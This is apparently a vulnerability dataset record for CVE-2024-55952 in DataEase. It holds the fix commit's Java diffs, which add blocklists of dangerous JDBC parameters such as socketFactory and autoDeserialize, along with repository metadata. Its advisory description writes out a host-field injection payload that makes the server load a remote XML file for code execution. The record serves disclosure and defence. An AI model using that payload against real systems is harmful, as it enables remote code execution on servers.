{
  "cve_id": "CVE-2024-55952",
  "github_data": {
    "repository": "dataease/dataease",
    "fix_commit": "0db4872a52eccf6e83dd9359aa05db52dd580ec1",
    "related_commits": [
      "0db4872a52eccf6e83dd9359aa05db52dd580ec1"
    ],
    "patch_url": null,
    "fix_commit_details": {
      "sha": "0db4872a52eccf6e83dd9359aa05db52dd580ec1",
      "commit_date": "2024-12-16T09:50:55Z",
      "author": {
        "login": "jinlong-T",
        "type": "User",
        "stats": {
          "total_commits": 2000,
          "average_weekly_commits": 2.5873221216041395,
          "total_additions": 0,
          "total_deletions": 0,
          "weeks_active": 167
        }
      },
      "commit_message": {
        "title": "fix: \u6570\u636e\u6e90\u4fee\u590dmysql\u3001Redshift\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e",
        "length": 32,
        "has_description": false,
        "references_issue": true
      },
      "stats": {
        "total": 55,
        "additions": 35,
        "deletions": 20
      },
      "files": [
        {
          "filename": "core/backend/src/main/java/io/dataease/dto/datasource/MysqlConfiguration.java",
          "status": "modified",
          "additions": 10,
          "deletions": 9,
          "patch": "@@ -19,24 +19,25 @@ public class MysqlConfiguration extends JdbcConfiguration {\n     private List<String> illegalParameters = Arrays.asList(\"autoDeserialize\", \"queryInterceptors\", \"statementInterceptors\", \"detectCustomCollations\", \"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\");\n \n     public String getJdbc() {\n+        String jdbcUrl = \"\";\n         if (StringUtils.isEmpty(extraParams.trim())) {\n-            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim());\n+            jdbcUrl = \"jdbc:mysql://HOSTNAME:PORT/DATABASE\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim());\n         } else {\n-            for (String illegalParameter : getIllegalParameters()) {\n-                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {\n-                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n-                }\n+            jdbcUrl = \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim()).replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n+        }\n+        for (String illegalParameter : getIllegalParameters()) {\n+            if (jdbcUrl.toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(jdbcUrl).contains(illegalParameter.toLowerCase())) {\n+                throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n             }\n-\n-            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim()).replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n         }\n+        return jdbcUrl;\n     }\n \n-    public List<String> getIllegalParameters(){\n+    public List<String> getIllegalParameters() {\n         List<String> newIllegalParameters = new ArrayList<>();\n         newIllegalParameters.addAll(illegalParameters);\n         newIllegalParameters.addAll(Arrays.asList(\"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\"));\n         return newIllegalParameters;\n     }\n \n-}\n\\ No newline at end of file\n+}"
        },
        {
          "filename": "core/backend/src/main/java/io/dataease/dto/datasource/PgConfiguration.java",
          "status": "modified",
          "additions": 10,
          "deletions": 8,
          "patch": "@@ -19,31 +19,33 @@ public class PgConfiguration extends JdbcConfiguration {\n \n \n     public String getJdbc() {\n+        String jdbcUrl = \"\";\n         if (StringUtils.isEmpty(extraParams.trim())) {\n             if (StringUtils.isEmpty(getSchema())) {\n-                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE\"\n+                jdbcUrl = \"jdbc:postgresql://HOSTNAME:PORT/DATABASE\"\n                         .replace(\"HOSTNAME\", getHost().trim())\n                         .replace(\"PORT\", getPort().toString().trim())\n                         .replace(\"DATABASE\", getDataBase().trim());\n             } else {\n-                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?currentSchema=SCHEMA\"\n+                jdbcUrl = \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?currentSchema=SCHEMA\"\n                         .replace(\"HOSTNAME\", getHost().trim())\n                         .replace(\"PORT\", getPort().toString().trim())\n                         .replace(\"DATABASE\", getDataBase().trim())\n                         .replace(\"SCHEMA\", getSchema().trim());\n             }\n         } else {\n-            for (String illegalParameter : illegalParameters) {\n-                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {\n-                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n-                }\n-            }\n-            return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\"\n+            jdbcUrl = \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\"\n                     .replace(\"HOSTNAME\", getHost().trim())\n                     .replace(\"PORT\", getPort().toString().trim())\n                     .replace(\"DATABASE\", getDataBase().trim())\n                     .replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n+        }\n \n+        for (String illegalParameter : illegalParameters) {\n+            if (jdbcUrl.toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(jdbcUrl).contains(illegalParameter.toLowerCase())) {\n+                throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n+            }\n         }\n+        return jdbcUrl;\n     }\n }"
        },
        {
          "filename": "core/backend/src/main/java/io/dataease/dto/datasource/RedshiftConfiguration.java",
          "status": "modified",
          "additions": 15,
          "deletions": 3,
          "patch": "@@ -4,17 +4,29 @@\n import lombok.Getter;\n import lombok.Setter;\n \n+import java.net.URLDecoder;\n+import java.util.Arrays;\n+import java.util.List;\n+\n @Getter\n @Setter\n public class RedshiftConfiguration extends JdbcConfiguration {\n \n     private String driver = \"com.amazon.redshift.jdbc42.Driver\";\n+    private List<String> illegalParameters = Arrays.asList(\"socketFactory\", \"socketFactoryArg\", \"sslfactory\", \"sslfactoryarg\", \"loggerLevel\", \"loggerFile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\");\n+\n \n     public String getJdbc() {\n-        // \u8fde\u63a5\u53c2\u6570\u5148\u5199\u6b7b\uff0c\u540e\u8fb9\u8981\u628a\u7f16\u7801\u3001\u65f6\u533a\u7b49\u53c2\u6570\u653e\u5230\u6570\u636e\u6e90\u7684\u8bbe\u7f6e\u4e2d\n-        return \"jdbc:redshift://HOSTNAME:PORT/DATABASE\"\n+\n+        String jdbcUrl = \"jdbc:redshift://HOSTNAME:PORT/DATABASE\"\n                 .replace(\"HOSTNAME\", getHost().trim())\n                 .replace(\"PORT\", getPort().toString().trim())\n                 .replace(\"DATABASE\", getDataBase().trim());\n+        for (String illegalParameter : illegalParameters) {\n+            if (jdbcUrl.toLowerCase().contains(illegalParameter.toLowerCase())) {\n+                throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n+            }\n+        }\n+        return jdbcUrl;\n     }\n-}\n\\ No newline at end of file\n+}"
        }
      ],
      "file_patterns": {
        "security_files": 0,
        "config_files": 3,
        "dependency_files": 0,
        "test_files": 0,
        "unique_directories": 1,
        "max_directory_depth": 9
      },
      "context": {
        "surrounding_commits": [
          {
            "sha": "7df76a1e373309576e67566aba42545193b0d344",
            "date": "2025-01-23T11:27:17Z",
            "author_login": "wisonic-s"
          },
          {
            "sha": "76019f98a00b87a8853f5cedbe53d0954d1ae551",
            "date": "2025-01-23T09:24:26Z",
            "author_login": "wanghe-fit2cloud"
          },
          {
            "sha": "1f86758a9fcedfbfd3bfeee91a38675347e8a0f1",
            "date": "2025-01-23T08:02:46Z",
            "author_login": "ulleo"
          },
          {
            "sha": "63be4ce890106f81d168c8615abf05eca83609e7",
            "date": "2025-01-22T10:57:42Z",
            "author_login": "jinlong-T"
          },
          {
            "sha": "8e9e35949ec2fd50caef46beb7a8063054287e8e",
            "date": "2025-01-22T08:06:03Z",
            "author_login": "wisonic-s"
          }
        ]
      }
    }
  },
  "vulnerability_details": {
    "cvss_score": null,
    "cvss_vector": null,
    "cwe_id": "CWE-20",
    "description": "DataEase is an open source business analytics tool. Authenticated users can remotely execute code through the backend JDBC connection. When constructing the jdbc connection string, the parameters are not filtered. Constructing the host as ip:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://ip:5432/1.xml&a= can trigger the ClassPathXmlApplicationContext construction method. The vulnerability has been fixed in v1.18.27. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "attack_vector": null,
    "attack_complexity": null
  },
  "temporal_data": {
    "published_date": "2024-12-18T19:15:11.933",
    "last_modified": "2024-12-18T19:15:11.933",
    "fix_date": "2024-12-16T09:50:55Z"
  },
  "references": [
    {
      "url": "https://github.com/dataease/dataease/commit/0db4872a52eccf6e83dd9359aa05db52dd580ec1",
      "source": "security-advisories@github.com",
      "tags": []
    },
    {
      "url": "https://github.com/dataease/dataease/security/advisories/GHSA-w8qm-xw38-93qw",
      "source": "security-advisories@github.com",
      "tags": []
    }
  ],
  "collection_metadata": {
    "collected_at": "2025-01-11T23:09:52.883036",
    "processing_status": "enhanced"
  },
  "repository_context": {
    "name": "dataease",
    "owner": "dataease",
    "created_at": "2021-02-02T04:10:21Z",
    "updated_at": "2025-01-26T06:20:44Z",
    "pushed_at": "2025-01-23T11:28:21Z",
    "size": 298185,
    "stars": 19170,
    "forks": 3442,
    "open_issues": 373,
    "watchers": 19170,
    "has_security_policy": false,
    "default_branch": "dev-v2",
    "protected_branches": [
      "dev"
    ],
    "languages": {
      "Java": 15128609,
      "Vue": 4007339,
      "Shell": 26817,
      "Lua": 22086,
      "Less": 12316,
      "Dockerfile": 952
    },
    "commit_activity": {
      "total_commits_last_year": 7250,
      "avg_commits_per_week": 139.42307692307693,
      "days_active_last_year": 272
    },
    "security_features": {
      "has_security_policy": false,
      "has_protected_branches": true,
      "has_wiki": false,
      "has_issues": true,
      "allow_forking": true,
      "is_template": false,
      "license": "gpl-3.0"
    },
    "collected_at": "2025-01-26T07:51:25.923324"
  }
}